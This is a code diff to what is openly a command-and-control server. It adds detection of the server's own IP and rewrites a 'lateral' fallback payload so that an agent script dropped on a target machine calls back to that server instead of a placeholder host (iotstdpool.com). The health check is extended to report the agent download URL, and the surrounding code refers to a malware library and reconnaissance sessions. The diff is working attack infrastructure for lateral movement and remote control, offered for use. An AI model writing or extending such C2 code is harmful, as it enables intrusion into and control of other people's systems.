@@ -28,6 +28,23 @@ HOST = "0.0.0.0"
 MAX_HISTORY_ITEMS = 1000
 MAX_RESULT_SIZE = 10 * 1024 * 1024  # 10MB
 
+# Public / reachable IP of this C2 — used to build the lateral-movement payload
+# so that advanced_agent.py dropped on 10.5.9.40 can call back to the right host.
+# Set via env var: C2_PUBLIC_IP=<your LAN ip>  (auto-detected if not set)
+def _detect_c2_host() -> str:
+    env = os.environ.get("C2_PUBLIC_IP", "")
+    if env:
+        return env
+    try:
+        import socket as _s
+        with _s.socket(_s.AF_INET, _s.SOCK_DGRAM) as _sock:
+            _sock.connect(("8.8.8.8", 80))
+            return _sock.getsockname()[0]
+    except Exception:
+        return "127.0.0.1"
+
+C2_PUBLIC_IP: str = _detect_c2_host()
+
 # Base directory — always relative to this file, regardless of CWD
 _BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
@@ -685,17 +702,38 @@ def save_raw_response_to_file(response, task_type):
         logger.error(f"Error saving raw response: {str(e)}")
 
 def fallback_code(task_type, reason):
-    """Get fallback code from external JSON file"""
+    """Get fallback code from external JSON file.
+
+    For the 'lateral' payload, replaces the hardcoded C2 placeholder
+    (iotstdpool.com) with the actual C2 public IP so that advanced_agent.py
+    dropped on the target Ubuntu machine calls back to the correct server.
+    The download URL is also rewritten to use this C2's own /downloads/ endpoint.
+    """
     logger.warning(f"Using fallback payload for '{task_type}': {reason}")
-    
+
     if task_type in fallback_payloads:
         logger.info(f"Loaded fallback payload for: {task_type}")
-        return fallback_payloads[task_type]
-    
+        code = fallback_payloads[task_type]
+
+        if task_type == "lateral":
+            # Replace legacy placeholder with the real C2 IP/port
+            C2_URL = f"http://{C2_PUBLIC_IP}:{PORT}"
+            code = (
+                code
+                .replace("http://iotstdpool.com:8000", C2_URL)
+                .replace("http://iotstdpool.com:5001", C2_URL)
+                .replace("iotstdpool.com:8000",        f"{C2_PUBLIC_IP}:{PORT}")
+                .replace("iotstdpool.com:5001",        f"{C2_PUBLIC_IP}:{PORT}")
+                .replace("iotstdpool.com",             C2_PUBLIC_IP)
+            )
+            logger.info(f"[LATERAL] payload templated → C2 = {C2_URL}")
+
+        return code
+
     if 'default' in fallback_payloads:
         logger.warning(f"Task '{task_type}' not found in fallback_payloads.json, using default")
         return fallback_payloads['default']
-    
+
     logger.error(f"CRITICAL: No fallback payload for '{task_type}' and no default in fallback_payloads.json")
     return f'Write-Host "Error: {reason} - No fallback payload configured in fallback_payloads.json"'
 
@@ -3927,7 +3965,10 @@ def health_check():
             "fallback_payloads_loaded": len(fallback_payloads),
             "available_payloads": list(fallback_payloads.keys()),
             "malware_library_scripts": len(malware_library.get("scripts", [])),
-            "autorecon_sessions": len(autorecon_sessions)
+            "autorecon_sessions": len(autorecon_sessions),
+            "c2_public_ip": C2_PUBLIC_IP,
+            "lateral_payload_c2": f"http://{C2_PUBLIC_IP}:{PORT}",
+            "agent_download_url": f"http://{C2_PUBLIC_IP}:{PORT}/downloads/advanced_agent.py",
         })
     except Exception as e:
         logger.error(f"Health check failed: {str(e)}")
